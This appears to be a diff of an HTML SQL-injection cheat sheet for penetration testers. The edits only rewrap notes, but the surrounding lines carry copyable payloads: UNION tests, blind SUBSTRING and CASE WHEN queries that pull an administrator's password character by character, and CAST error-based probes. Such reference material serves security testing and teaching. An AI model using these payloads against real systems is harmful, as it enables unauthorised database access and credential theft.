@@ -36,8 +36,7 @@
 	
 <b>DESCRIPTION:</b> List of the normal characters used to test the vulnerability. Can be used on <u>GET:POST</u> "SEARCH/SELECT"
 	
-Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 Internal Server Error]</b> It can be parameters, input 
-fields, etc.
+Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 Internal Server Error]</b> It can be parameters, input fields, etc.
 	
 <b>C1: </b><mark id="HDT001">'</mark>
 <b>C2: </b><mark id="HDT002">''</mark> Try with space as well. <b>' '</b>
@@ -48,7 +47,7 @@ fields, etc.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button>
 
-<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>]. Also, it is 
+<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>].
 
 </details>
 <details>
@@ -101,8 +100,8 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 <b>C3: ORACLE TEST </b><mark id="DTT05">' UNION SELECT 'a','a' FROM DUAL--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT05')">.C3.</button>
 <br>
-<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns is needed. Also, for ORACLE 
-the select statement <u>is needed a table to search from</u>, it can be any table.
+<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns is needed. Also, for ORACLE the select 
+statement <u>is needed a table to search from</u>, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
@@ -198,8 +197,7 @@ the select statement <u>is needed a table to search from</u>, it can be any tabl
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT05')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT06')">.C3.</button>
 
 </details>
-<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two columns and both type 
-string.
+<b>NOTE:</b> Both ways needs to know the column number, field type and both examples are assuming it has two columns and both type string.
 
 </details>
 <details>
@@ -253,8 +251,8 @@ string.
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
-<b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small 
-changes. Inspect the headers in burpsuite to check if exist something querying the application. 
+<b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. 
+Inspect the headers in burpsuite to check if exist something querying the application. 
 
 <details>
 <summary>CONDITIONAL RESPONSES</summary>	
@@ -286,16 +284,15 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT05')">.C1.</button>
 
-<b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached hits the 
-FALSE statement the lenght is founded.
+<b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached hits the FALSE statement 
+the lenght is founded.
 
 <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
 	
 <b>C1: </b><mark id="BAT06">' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
 
-"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than 
-the value...
+"first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than the value...
 
 <b>C2: </b><mark id="BAT07">' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</mark>
@@ -313,8 +310,8 @@ the value...
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button>
 
-So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times with 
-each letter, number, etc. For that reason a pre-req is to know the value lenght. 
+So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to iterate more times with each letter, 
+number, etc. For that reason a pre-req is to know the value lenght. 
 
 <b><u>CLUSTER BOMB ATTACK !</u></b> - two positions
 
@@ -366,8 +363,8 @@ interpreted as SQL query, also, you know that a table exist you can guess users.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT016')">.C4.</button>
 
-<b>NOTE: </b> This condition should be true, confirming that the password is greater than 1 character in length. Intruder attack until the 
-error dissapears, meaning the final value is the total lenght. 
+<b>NOTE: </b> This condition should be true, confirming that the password is greater than 1 character in length. Intruder attack until the error 
+dissapears, meaning the final value is the total lenght. 
 
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>6 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
@@ -385,8 +382,7 @@ error dissapears, meaning the final value is the total lenght.
 
 <details>
 <summary>VISIBLE ERROR-BASED</summary>
-<b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking 
-for errors. 
+<b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for errors. 
 
 <u>::: 1. CREATE A GENERIC SELECT SUBQUERY AND CAST THE RETURNED VALUE TO AN INT DATA TYPE</u>
 
@@ -395,8 +391,8 @@ for errors.
 <b>C1: </b><mark id="VEB01">' AND CAST((SELECT 1) AS int)--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB01')">.C1.</button>
 
-<b>NOTE: </b> If you get some errors about boolean expressions, you can try another comparison operator. Getting no errors means the 
-query is valid syntax format.
+<b>NOTE: </b> If you get some errors about boolean expressions, you can try another comparison operator. Getting no errors means the query is 
+valid syntax format.
 
 <b>C2: </b><mark id="VEB02">' AND 1=CAST((SELECT 1) AS int)--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB02')">.C2.</button>
@@ -420,8 +416,8 @@ query is valid syntax format.
 </details></details>
 <details>
 <summary>TIME DELAY TECHNIQUES</summary>
-<b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
-since the query is executed synchronously, it is possible to trigger conditional time delays get results. 
+<b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However, since 
+the query is executed synchronously, it is possible to trigger conditional time delays get results. 
 
 <b>::: 1. IDENTIFY IF TIME DELAY TECHNIQUE CAN BE USED [10 seconds]</b>
 
